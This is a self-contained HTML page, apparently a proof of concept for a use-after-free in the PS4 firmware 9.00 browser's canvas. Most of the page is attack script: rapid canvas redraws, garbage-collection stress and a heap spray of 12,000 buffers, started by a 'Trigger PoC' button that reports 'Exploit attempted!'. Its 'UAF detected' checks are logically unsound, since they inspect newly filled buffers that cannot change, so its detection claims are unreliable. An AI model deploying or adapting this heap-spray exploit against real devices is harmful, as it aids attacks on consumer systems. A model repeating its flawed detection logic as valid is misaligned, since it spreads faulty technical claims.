<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Canvas UAF PoC (PS4 9.00)</title>
    <style>
        #trigger {
            margin: 20px 0;
            padding: 12px;
            font-size: 18px;
            cursor: pointer;
        }
        #status {
            margin-top: 10px;
            font-weight: bold;
            color: darkred;
        }
        #canvas {
            display: none;
        }
    </style>
</head>
<body>
    <h1>Canvas UAF PoC (PS4 9.00)</h1>
    <p>Click to trigger the PoC. Expect a crash or UAF detection.</p>
    <button id="trigger">Trigger PoC</button>
    <div id="status">Idle...</div>
    <canvas id="canvas" width="512" height="512"></canvas>
    <script>
        const canvas = document.getElementById('canvas');
        const ctx = canvas.getContext('2d');
        const status = document.getElementById('status');
        let attemptCount = 0;

        function stressGC() {
            for (let i = 0; i < 500; i++) {
                new ArrayBuffer(1024 * 1024);
            }
        }

        function sprayHeap() {
            const arrays = [];
            for (let i = 0; i < 12000; i++) {
                const buf = new Uint8Array(4096);
                buf.fill(0x44);
                arrays.push(buf);
            }
            return arrays;
        }

        function drawOnCanvas() {
            ctx.fillStyle = `rgb(${Math.random() * 255}, ${Math.random() * 255}, ${Math.random() * 255})`;
            ctx.fillRect(0, 0, canvas.width, canvas.height);
            ctx.beginPath();
            ctx.arc(Math.random() * canvas.width, Math.random() * canvas.height, 50, 0, 2 * Math.PI);
            ctx.fill();
            // Stress with ImageData
            const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
            for (let i = 0; i < imageData.data.length; i++) {
                imageData.data[i] = Math.random() * 255;
            }
            ctx.putImageData(imageData, 0, 0);
        }

        function checkImageDataUAF(imageData) {
            const original = new Uint8Array(imageData.data);
            ctx.putImageData(imageData, 0, 0);
            const current = ctx.getImageData(0, 0, canvas.width, canvas.height).data;
            for (let i = 0; i < original.length; i++) {
                if (original[i] !== current[i]) {
                    return true; // UAF detected
                }
            }
            return false;
        }

        function triggerExploit() {
            attemptCount++;
            status.textContent = `Attempt ${attemptCount} in progress...`;

            try {
                // Create reference ImageData
                const refImageData = ctx.createImageData(512, 512);
                for (let i = 0; i < refImageData.data.length; i++) {
                    refImageData.data[i] = 0x46;
                }

                // Intensive drawing
                const drawInterval = setInterval(drawOnCanvas, 1);

                // Check for UAF
                setTimeout(() => {
                    // First UAF check (buffer)
                    const testBuf = new Uint8Array(4096);
                    testBuf.fill(0x46);
                    if (testBuf[0] !== 0x46) {
                        status.textContent = 'Early UAF detected!';
                        clearInterval(drawInterval);
                        return;
                    }

                    // Second UAF check (ImageData)
                    if (checkImageDataUAF(refImageData)) {
                        status.textContent = 'ImageData UAF detected!';
                        clearInterval(drawInterval);
                        return;
                    }

                    stressGC();
                    const arrays = sprayHeap();

                    // Third UAF check (buffer after spray)
                    const testBuf2 = new Uint8Array(4096);
                    testBuf2.fill(0x47);
                    if (testBuf2[0] !== 0x47) {
                        status.textContent = 'Second UAF detected!';
                        clearInterval(drawInterval);
                        return;
                    }

                    status.textContent = 'Exploit attempted!';
                    clearInterval(drawInterval);
                }, 200);
            } catch (err) {
                console.error(`Error: ${err.message}`);
                status.textContent = `Failed: ${err.message}`;
            }
        }

        document.getElementById('trigger').addEventListener('click', () => {
            try {
                triggerExploit();
            } catch (err) {
                console.error(`Error: ${err.message}`);
                status.textContent = `Failed: ${err.message}`;
            }
        });
    </script>
</body>
</html>
